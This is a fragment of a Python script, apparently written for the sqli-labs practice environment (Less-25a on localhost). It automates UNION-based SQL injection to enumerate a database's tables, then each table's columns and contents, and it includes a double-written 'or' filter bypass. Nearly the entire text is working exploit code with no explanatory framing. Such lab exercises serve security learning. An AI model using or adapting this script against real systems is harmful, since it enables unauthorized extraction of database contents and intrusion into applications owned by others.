...
url = "http://localhost:1234/Less-25a/?id="
session = requests.Session()

payload = "0 union select 1,{},3"
response = requests.post(url+payload.format(get_table))
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url+payload.format(get_table))
temp = response.text[577:-303-len(payload.format(get_table))]
tables = temp.split(',')
for i in tables:
    print("From Table", i, ": ")
    ...
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url+payload.format(find))
    temp = response.text[577:-303-len(payload.format(find))]
    columns = temp.split(',')
    ...
    for j in columns:
        ...
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url+payload.format(find))
        print(response.text[577:-305-len(payload.format(find).replace('oorr', 'or'))])
